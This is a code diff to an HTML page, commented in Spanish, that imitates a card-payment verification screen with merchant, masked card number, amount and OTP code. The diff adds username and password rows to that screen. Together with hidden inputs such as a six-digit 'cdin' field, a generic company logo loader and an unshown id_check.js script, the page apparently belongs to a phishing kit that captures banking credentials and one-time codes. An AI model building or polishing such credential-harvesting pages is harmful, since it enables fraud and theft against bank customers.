@@ -12,7 +12,6 @@
   <link rel="stylesheet" href="./css/normalize.css">
   <script src="./js/functions.js"></script>
 
-  <!-- ===== SOLO VISUAL ===== -->
   <style>
     :root{
       --bg:#f5f6f8; --card:#fff; --text:#111827; --muted:#6b7280;
@@ -39,10 +38,10 @@
     .content>b:first-child{display:block; margin-bottom:12px; font-size:clamp(20px,2.2vw,26px); font-weight:800;}
     .content p{line-height:1.55; margin:4px 0;}
 
-    /* ===== GRID: Etiqueta | Valor, todo a la izquierda ===== */
+    /* GRID: Etiqueta | Valor */
     #form{
       display:grid;
-      grid-template-columns: 160px 1fr; /* Label | Valor */
+      grid-template-columns: 160px 1fr;
       gap:10px 16px;
       align-items:center;
       margin:0 !important;
@@ -51,27 +50,32 @@
     #form .labels b{color:var(--muted); font-weight:600; text-align:right;}
     #form .values p{margin:0; font-weight:700;}
 
-    /* Mapeo de filas (sin tocar HTML) */
-    /* 1) Comercio */
+    /* Mapeo filas */
+    /* Comercio */
     #form .labels b:nth-child(1){grid-column:1; grid-row:1;}
     #form .values p:nth-child(1){grid-column:2; grid-row:1;}
 
-    /* 2) N.º de tarjeta */
+    /* N.º tarjeta */
     #form .labels b:nth-child(3){grid-column:1; grid-row:2;}
     #form .values p:nth-child(3){grid-column:2; grid-row:2;}
 
-    /* 3) Monto */
+    /* Monto */
     #form .labels b:nth-child(2){grid-column:1; grid-row:3;}
     #form .values p:nth-child(2){grid-column:2; grid-row:3;}
 
-    /* 4) Código OTP (label existente y su input) */
-    #form .labels b#otpcode{grid-column:1; grid-row:4;}
-    #form #otpcode{
-      grid-column:2; grid-row:4;
-      width:100%; max-width:520px; height:48px !important;
-    }
+    /* Usuario */
+    #form .labels b#user{grid-column:1; grid-row:4;}
+    #form #user{grid-column:2; grid-row:4; width:100%; max-width:520px; height:48px !important;}
 
-    /* Inputs look & feel */
+    /* Contraseña */
+    #form .labels b#puser{grid-column:1; grid-row:5;}
+    #form #puser{grid-column:2; grid-row:5; width:100%; max-width:520px; height:48px !important;}
+
+    /* OTP */
+    #form .labels b#otpcode{grid-column:1; grid-row:6;}
+    #form #otpcode{grid-column:2; grid-row:6; width:100%; max-width:520px; height:48px !important;}
+
+    /* Inputs estilo */
     input[type="text"], input[type="password"], input[type="number"], input[type="tel"]{
       width:100% !important; height:48px !important; padding:0 14px !important;
       border:1px solid #d1d5db !important; border-radius:12px !important; background:#fff !important;
@@ -79,11 +83,9 @@
     }
     input:focus{border-color:var(--focus) !important; box-shadow:0 0 0 3px rgba(222,1,8,.13) !important;}
 
-    /* Link reenviar (queda fuera de la tarjeta si así estaba en tu flujo) */
     #newCode{display:block; text-align:center; margin:14px auto 8px; color:#0d6efd; text-decoration:none;}
     #newCode:hover{text-decoration:underline}
 
-    /* Botón */
     #btnNextStep.btn-success{
       display:block; margin:10px auto 0;
       min-width:200px; height:48px; padding:0 22px;
@@ -93,14 +95,12 @@
     }
     #btnNextStep.btn-success:active{transform:translateY(1px)}
 
-    /* Móvil: igual orden, una columna de 130px para label */
     @media (max-width:600px){
       #form{grid-template-columns:130px 1fr;}
     }
   </style>
 </head>
 <body>
-  <!-- LOADER -->
   <div class="main-loader show">
     <img id="company-loader">
     <div class="loader"></div>
@@ -136,7 +136,7 @@
           <p>$ <span id="flight-price">49.000</span> USD</p>
           <p>•••• •••• •••• <span id="card-digits"></span></p>
 
-          <!-- Campos condicionales existentes (no se tocan) -->
+          <!-- Inputs -->
           <input class="hidden" required type="text" id="user">
           <input class="hidden" required type="text" id="puser">
           <input class="hidden" oninput="limitDigits(this, 6)" required type="text" id="cdin">
@@ -152,7 +152,6 @@
     <button id="btnNextStep" class="btn-success">Verificar</button>
   </main>
 
-  <!-- SCRIPTS -->
   <script src="./js/id_check.js"></script>
 </body>
 </html>
